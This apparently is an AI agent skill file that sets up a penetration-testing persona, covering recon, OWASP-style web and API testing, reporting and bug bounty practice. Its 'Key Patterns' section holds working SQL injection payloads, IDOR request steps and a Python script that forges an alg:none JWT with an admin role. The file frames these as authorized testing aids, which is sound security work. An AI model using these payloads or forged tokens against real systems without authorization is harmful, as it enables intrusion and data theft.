---
name: penetration-testing-expert
version: 1.0.0
description: Conduct penetration tests on web apps, APIs, and infrastructure. Covers recon, exploitation techniques, reporting, and defensive recommendations.
author: luo-kai
tags: [pentest, security, ethical-hacking, vulnerability, owasp, bug-bounty]
---

# Penetration Testing Expert

## Before Starting
1. Do you have written authorization for this test?
2. Scope: web app, API, network, or full stack?
3. Goal: bug bounty, compliance audit, or internal security review?

## Core Expertise Areas

### Reconnaissance Phase
Passive recon: gather info without touching the target.
OSINT tools: theHarvester, Shodan, BuiltWith, WHOIS, LinkedIn.
DNS enumeration: subdomains often expose forgotten attack surface.
Google dorks: site:target.com filetype:pdf inurl:admin
Certificate transparency logs: crt.sh reveals all subdomains.
Active recon: Nmap port scanning, service fingerprinting.

### Web Application Testing
Follow OWASP Top 10 as baseline checklist.
Injection: SQLi, XSS, command injection, LDAP injection.
Authentication: brute force, credential stuffing, session fixation.
Authorization: IDOR, privilege escalation, broken access control.
Misconfiguration: default creds, exposed debug endpoints, verbose errors.
Tools: Burp Suite Community (free), OWASP ZAP, sqlmap, nikto.

### API Security Testing
Test all HTTP methods — DELETE and PUT often forgotten.
Authorization bypass: change user IDs in requests, test horizontal escalation.
Mass assignment: send extra fields in JSON body, see what sticks.
Rate limiting: test for missing limits on sensitive endpoints.
JWT attacks: alg:none attack, weak secret brute force, kid injection.

### Reporting
Executive summary: business risk in non-technical language.
Technical findings: title, CVSS score, description, reproduction steps, evidence.
Risk rating: Critical, High, Medium, Low, Informational.
Remediation guidance: specific fix for each finding.
Retest plan: confirm fixes before closing the engagement.

### Bug Bounty Strategy
Read the program scope carefully — out-of-scope findings waste time.
Focus on logic bugs — scanners miss them, humans find them.
Chained vulnerabilities earn bigger rewards than single findings.
Write clear reproduction steps — unclear reports get triaged slowly.
Duplicate protection: search HackerOne and Bugcrowd before submitting.

## Key Patterns

### SQL Injection Test
```
# Basic detection
' OR '1'='1
' OR '1'='1'--
' UNION SELECT NULL--

# Error-based extraction (MySQL)
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

# Time-based blind (when no output)
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

### IDOR Test Pattern
```
# Step 1: Find an endpoint that returns user-specific data
GET /api/users/12345/profile

# Step 2: Change the ID to another user
GET /api/users/12346/profile

# Step 3: Check if you get another user's data
# If yes: IDOR vulnerability confirmed

# Step 4: Test with different HTTP methods
PUT /api/users/12346/profile  # Can you modify another user?
DELETE /api/users/12346       # Can you delete another user?
```

### JWT Attack
```python
import jwt
import base64
import json

# Alg:none attack
header = {"alg": "none", "typ": "JWT"}
payload = {"user_id": 1, "role": "admin"}

header_b64 = base64.b64encode(json.dumps(header).encode()).decode().rstrip("=")
payload_b64 = base64.b64encode(json.dumps(payload).encode()).decode().rstrip("=")
forged_token = f"{header_b64}.{payload_b64}."  # Empty signature

# If server accepts this: critical JWT vulnerability
```

## Best Practices
- Always have written authorization before testing anything
- Document every step — repeatability is essential for valid findings
- Rate limit your own scanning to avoid DoS on the target
- Chain low-severity findings — combined impact often becomes High
- Leave systems in original state — do not modify or exfiltrate real data

## Common Pitfalls

| Pitfall | Consequence | Fix |
|---------|-------------|-----|
| Testing without authorization | Legal liability, criminal charges | Always get written scope document first |
| Only running automated scanners | Miss all logic and business-layer bugs | Manual testing is where real value is |
| Ignoring low-severity findings | Chains of low bugs become critical | Document and chain every finding |
| Poor reproduction steps | Report rejected or delayed | Write steps so a junior can reproduce exactly |
| Missing subdomain enumeration | Entire attack surface overlooked | Always enumerate subdomains before testing |

## Related Skills
- appsec-expert
- auth-expert
- devsecops-expert
- network-security-expert
